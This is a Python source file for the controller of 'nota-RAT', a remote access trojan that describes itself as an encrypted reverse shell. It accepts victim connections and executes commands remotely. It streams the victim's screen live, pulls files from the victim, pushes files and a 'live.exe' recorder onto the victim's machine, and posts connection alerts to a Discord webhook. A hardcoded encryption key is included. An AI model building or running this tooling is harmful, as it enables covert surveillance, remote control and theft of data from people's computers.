import socket, argparse, subprocess, re, time, os, pyotp, maskpass, qrcode
from sys import platform
from threading import Thread
from PIL import Image
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=421, help="Port of the Server", type=int
)


n = 0
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
args = parser.parse_args()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARED{END}'


print(f"""{PLOAD}
                       __                                           __     
                      /  |                                         /  |    
 _______    ______   _$$ |_     ______          ______   ______   _$$ |_   
/       \  /      \ / $$   |   /      \        /      \ /      \ / $$   |  
$$$$$$$  |/$$$$$$  |$$$$$$/    $$$$$$  |      /$$$$$$  |$$$$$$  |$$$$$$/   
$$ |  $$ |$$ |  $$ |  $$ | __  /    $$ |      $$ |  $$/ /    $$ |  $$ | __ 
$$ |  $$ |$$ \__$$ |  $$ |/  |/$$$$$$$ |      $$ |     /$$$$$$$ |  $$ |/  |
$$ |  $$ |$$    $$/   $$  $$/ $$    $$ |      $$ |     $$    $$ |  $$  $$/ 
$$/   $$/  $$$$$$/     $$$$/   $$$$$$$/       $$/       $$$$$$$/    $$$$/                                                  
                                           {END}nota RAT v1.0 | fluffydolphin                             
""")


print(f'\n[{GREEN}Shell{END}] Configuration\n')

if 'config.txt' in os.listdir():
    file = open('config.txt', 'r')
    f = file.read()
    otp, discord = f.split('\n')
    cringe, otp = otp.split('=')
    cringe, discord = discord.split('=')
    if discord == "no": print(f"    [{INFO}] Discord webhook disabled\n")
    else: print(f"    [{INFO}] Discord webhook enabled\n")
    if otp == "no": 
        print(f"    [{INFO}] OTP disabled\n")
    else:
        pwd = maskpass.askpass(prompt=f"\n[{INPUT}] Enter code: ", mask="*")
        totp = pyotp.TOTP(otp)
        totp_verify = totp.verify(pwd)

        if totp_verify != True:
            print(f"[{INFO}] Incorrect\n")
            exit()
        print(f"[{INFO}] Correct\n")
else:
    with open('config.txt', 'w') as f:
        data = input(f"\n[{IMPORTANT}] Do you want to enable a Discord webhook (y/n)? ")
        while(data != "y" and data != "n"):
                print(f"[{FAILED}] (y/n) \n{END}")
                time.sleep(0.4)
                data = input(f"\n[{IMPORTANT}] Do you want to enable a Discord webhook (y/n)? ")
        if data == "n":
            print(f"\n[{INFO}] Discord webhook disabled\n")
            discord_answer = 'discord=no'
            discord = "no"
        if data == "y":
            discord_webhook = input(f"[{IMPORTANT}] Discord webhook URI? ")
            discord_answer = f"discord={discord_webhook}"
            discord = discord_webhook
        data = input(f"\n[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
        while(data != "y" and data != "n"):
                print(f"[{FAILED}] (y/n) \n{END}")
                time.sleep(0.4)
                data = input(f"\n[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
        if data == "n":
            print(f"\n[{IMPORTANT}] It is recommended to enable OTP\n")
            otp_answer = "OTP=no\n"
        if data == "y":
            uri_name = input(f"[{IMPORTANT}] TOTP name? ")
            uri_issuer_name = input(f"[{IMPORTANT}] TOTP issuer name? ")
            secret_key = input(f"[{IMPORTANT}] TOTP secret key? ")
            uri = pyotp.totp.TOTP(secret_key).provisioning_uri(name=uri_name, issuer_name=uri_issuer_name)
            img = qrcode.make(uri)
            img.save('nota-RAT_qrcode.png')
            otp_answer = f"OTP={secret_key}\n"
            print(f"\n[{INFO}] Authentication URI: {uri}")
            print(f"\n[{INFO}] Successfully generated qrcode")
            imgs = Image.open('nota-RAT_qrcode.png')
            imgs.show()
            pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
            totp = pyotp.TOTP(secret_key)
            totp_verify = totp.verify(pwd)
            if totp_verify != True:
                print(f"[{INFO}] Incorrect\n")
                exit()
            print(f"[{INFO}] Correct\n")
        to_write = [otp_answer, discord_answer]
        f.writelines(to_write)
        discord = discord_answer
        otp = otp_answer
        cringe, otp = otp.split('=')
        otp = otp.replace('\n', '')
        cringe, discord = discord.split('=')
        f.close()

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"\n[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} ......{END}")

client_socket, client_address = s.accept()
print(f"[{IMPORTANT}] {BOLD}{client_address[0]}:{client_address[1]} Connected! \n{END}")
time.sleep(1)
print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt ......{END}', end = '\n\n')
time.sleep(1.8)

if discord != "no":
    if platform == 'win32':
        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
        ping = re.search(", Average = (.*)\r", pings_command)
        ping = ping.groups()
        ping = str(ping)
        ping = ping.replace("(", "")
        ping = ping.replace(")", "")
        ping = ping.replace(",", "")
        ping = ping.replace("'", "")
        ping = ping.replace("'", "")
    else: 
        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
        ping = re.split("/", pings_command)
        ping = ping[-1].replace("\n", "")


    webhook = DiscordWebhook(url=discord, content='@everyone')
    embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
    embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
    embed.add_embed_field(name='Ping', value=f'{ping}')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()


cwd = client_socket.recv(BUFFER_SIZE)
cwd = Fernet(key).decrypt(cwd).decode()
print(f"[{GREEN}Shell{END}] [+] Current working directory:", cwd)

while True:
    try:
        command = input(f"\n[{INPUT}] {cwd} $> ")
        if not command.strip():
            continue
        if command == "/exit" or command == "/quit" or command == "/q" or command == "exit":
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
            while(exit_choice != "y" and exit_choice != "n"):
                print(f"[{FAILED}] (y/n) \n{END}")
                time.sleep(0.4)
                exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
            if exit_choice == "y":
                if n == 1:
                    command = "/stoplive"
                    command = Fernet(key).encrypt(command.encode())
                    client_socket.send(command)
                    receiver.stop_server()
                if discord != 'no':
                    webhook = DiscordWebhook(url=discord, content='@everyone')
                    embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
                    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
                    embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
                    embed.set_timestamp()
                    webhook.add_embed(embed)
                    webhook.execute()
                commands = "exit"
                commands = Fernet(key).encrypt(commands.encode())
                client_socket.send(commands)
                msg = client_socket.recv(BUFFER_SIZE)
                msg = Fernet(key).decrypt(msg).decode()
                client_socket.close()
                s.close()
                print(f"\n[{EXIT}] {msg}\n")
                break
            if exit_choice == "n":
                continue
        if command == "/clear":
            def clear():
                os.system('cls' if os.name=='nt' else 'clear')
                return("   ")
            clear()
            print(f"[{CLEAR}] ")
            continue
        if command == "/help":
            print(
        f'''{MAIN}
        \r  Command                    Description
        \r  -------                    -----------
        \r  /help                      Print this message.
        \r  /getlive                   Gets a live feed of victim's screen.
        \r  /stoplive                  Stop the live feed of victim's screen.
        \r  /sendfile                  Sends a file from the files directory in the victom's CWD directory.
        \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
        \r  /config                    Allows you to change the config file
        \r  /clear                     Clear screen.
        \r  /exit/quit/q               Close session and exit.
        {END}''')
            continue
        if command == "/config":
            print(f'\n[{GREEN}Shell{END}] Configuration\n')
            print(f"[{IMPORTANT}] 1) OTP\n[{IMPORTANT}] 2) Discord\n")
            response = str(input(f"[{INPUT}] What do you want to configure (1/2)? "))
            while(response != "1" and response != "2"):
                print(f"[{FAILED}] (1/2) \n{END}")
                time.sleep(0.4)
                response = input(f"[{INPUT}] What do you want to configure (1/2)? ")
            with open('config.txt', 'w') as f:
                if response == "2":
                    otp_answer = f"OTP={otp}\n"
                    if discord == "no":
                        data = input(f"\n[{IMPORTANT}] Do you want to enable a Discord webhook (y/n)? ")
                        while(data != "y" and data != "n"):
                                print(f"[{FAILED}] (y/n) \n{END}")
                                time.sleep(0.4)
                                data = input(f"\n[{IMPORTANT}] Do you want to enable a Discord webhook (y/n)? ")
                        if data == "n":
                            print(f"\n[{INFO}] Discord webhook disabled\n")
                            discord_answer = 'discord=no'
                            discord = "no"
                        if data == "y":
                            discord_webhook = input(f"[{IMPORTANT}] Discord webhook URI? ")
                            discord_answer = f"discord={discord_webhook}"
                    else:
                        data = input(f"\n[{INFO}] Do you want to disable a Discord webhook (y/n)? ")
                        while(data != "y" and data != "n"):
                                print(f"[{FAILED}] (y/n) \n{END}")
                                time.sleep(0.4)
                                data = input(f"\n[{IMPORTANT}] Do you want to disable a Discord webhook (y/n)? ")
                        if data == "n":
                            pass
                        if data == "y":
                            print(f"\n[{IMPORTANT}] Discord webhook disabled\n")
                            discord_answer = 'discord=no'
                            discord = "no"
                if response == "1":
                    discord_answer = f"discord={discord}"
                    if  otp == "no":
                        data = input(f"\n[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
                        while(data != "y" and data != "n"):
                                print(f"[{FAILED}] (y/n) \n{END}")
                                time.sleep(0.4)
                                data = input(f"\n[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
                        if data == "n":
                            print(f"\n[{IMPORTANT}] It is recommended to enable OTP\n")
                            otp_answer = "OTP=no\n"
                        if data == "y":
                            uri_name = input(f"[{IMPORTANT}] TOTP name? ")
                            uri_issuer_name = input(f"[{IMPORTANT}] TOTP issuer name? ")
                            secret_key = input(f"[{IMPORTANT}] TOTP secret key? ")
                            uri = pyotp.totp.TOTP(secret_key).provisioning_uri(name=uri_name, issuer_name=uri_issuer_name)
                            img = qrcode.make(uri)
                            img.save('nota-RAT_qrcode.png')
                            otp_answer = f"OTP={secret_key}\n"
                            print(f"\n[{INFO}] Authentication URI: {uri}")
                            print(f"\n[{INFO}] Successfully generated qrcode")
                            imgs = Image.open('nota-RAT_qrcode.png')
                            imgs.show()
                            pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
                            totp = pyotp.TOTP(secret_key)
                            totp_verify = totp.verify(pwd)
                            if totp_verify != True:
                                print(f"[{INFO}] Incorrect\n")
                                exit()
                            print(f"[{INFO}] Correct\n")
                    else: 
                        data = data = input(f"\n[{IMPORTANT}] Do you want to disable OTP (y/n)? ")
                        while(data != "y" and data != "n"):
                                print(f"[{FAILED}] (y/n) \n{END}")
                                time.sleep(0.4)
                                data = data = input(f"\n[{IMPORTANT}] Do you want to disable OTP (y/n)? ")
                        if data == "n":
                            pass
                        if data == "y":
                            print(f"\n[{IMPORTANT}] It is recommended to enable OTP\n")
                            otp_answer = "OTP=no\n"
                            os.remove("nota-RAT_qrcode.png")
                to_write = [otp_answer, discord_answer]
                f.writelines(to_write)
                discord = discord_answer
                otp = otp_answer
                cringe, otp = otp.split('=')
                otp = otp.replace('\n', '')
                cringe, discord = discord.split('=')
                f.close()
            continue
        if command != "/clear" and command != "/help" and command != "/config":
            commandz = Fernet(key).encrypt(command.encode())
            client_socket.send(commandz)
        if command == "/getfile":
            filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
            filename = Fernet(key).encrypt(filenames.encode())
            client_socket.send(filename)
            file_location = client_socket.recv(BUFFER_SIZE)
            file_location = Fernet(key).decrypt(file_location).decode()
            if file_location == "no":
                print(f"[{INFO}] File not found: {filenames}")
                continue
            if file_location == "yes":
                file_start = client_socket.recv(BUFFER_SIZE)
                file_start = Fernet(key).decrypt(file_start).decode()
                print(f"[{INFO}] {file_start}")
                remaining = int.from_bytes(client_socket.recv(4),'big')
                f = open(f"./files/{filenames}","wb")
                while remaining:
                    data = client_socket.recv(min(remaining,4096))
                    remaining -= len(data)
                    f.write(data)
                f.close()
                print(f"[{INFO}] received {filenames}\n")
        if command == "/sendfile":
            filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
            if os.path.exists(fr"./files/{filenames}") == False:
                path_exist = Fernet(key).encrypt("no".encode())
                client_socket.send(path_exist)
                print(f"[{INFO}] File not found: ./files/{filenames}")
                continue
            if os.path.exists(fr"./files/{filenames}") == True:
                print(f"[{INFO}] Sending {filenames}")
                path_exist = Fernet(key).encrypt("yes".encode())
                client_socket.send(path_exist)
                time.sleep(0.5)
                filename = Fernet(key).encrypt(filenames.encode())
                client_socket.send(filename)
                with open(f"./files/{filenames}", "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    client_socket.send(dataLen.to_bytes(4,'big'))
                    client_socket.send(data)
                f.close()
                file_finish = client_socket.recv(BUFFER_SIZE)
                file_finish = Fernet(key).decrypt(file_finish).decode()
                print(f"[{INFO}] {file_finish}\n")
        if command == "/getlive":
            n = 1
            from vidstream import StreamingServer
            if n == 2:
                receiver = StreamingServer(IPAddr, 422)
            else: receiver = StreamingServer(IPAddr, 423)
            server_location = client_socket.recv(BUFFER_SIZE)
            server_location = Fernet(key).decrypt(server_location).decode()
            if server_location == "no":
                print(f"\n[{IMPORTANT}] Transfering live recorder ......")
                with open("live.exe", "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    client_socket.send(dataLen.to_bytes(4,'big'))
                    client_socket.send(data)
                f.close()
                server_state = client_socket.recv(BUFFER_SIZE)
                server_state = Fernet(key).decrypt(server_state).decode()
                print(f"[{IMPORTANT}] {server_state}")
            if server_location == "yes":
                print(f"\n[{IMPORTANT}] Found live Streaming Server on RAT")
            print(f"[{IMPORTANT}] Starting live Streaming Server ......")
            p = Thread(target=receiver.start_server)
            p.start()
            server_state = client_socket.recv(BUFFER_SIZE)
            server_state = Fernet(key).decrypt(server_state).decode()
            print(f"[{IMPORTANT}] {server_state}")
            continue
        if command == "/stoplive":
            n = 2
            receiver.stop_server()
            receiver = StreamingServer(IPAddr, 422)
            continue
        output = client_socket.recv(BUFFER_SIZE)
        output = Fernet(key).decrypt(output).decode()
        results, cwd = output.split(SEPARATOR)
        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive" and command != "/OTP":
            print(f"{GREEN}{results}{END}")
        else: continue
    except KeyboardInterrupt:
        exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
        while(exit_choice != "y" and exit_choice != "n"):
            print(f"[{FAILED}] (y/n) \n{END}")
            time.sleep(0.4)
            exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
        if exit_choice == "y":
            if n == 1:
                command = "/stoplive"
                command = Fernet(key).encrypt(command.encode())
                client_socket.send(command)
                receiver.stop_server()
            if discord != "no":
                webhook = DiscordWebhook(url=discord, content='@everyone')
                embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
                embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
                embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()
            commands = "exit"
            commands = Fernet(key).encrypt(commands.encode())
            client_socket.send(commands)
            msg = client_socket.recv(BUFFER_SIZE)
            msg = Fernet(key).decrypt(msg).decode()
            client_socket.send(commands)
            client_socket.close()
            s.close()
            print(f"\n[{EXIT}] {msg}\n")
            break
        if exit_choice == "n":
            continue
client_socket.close()
s.close()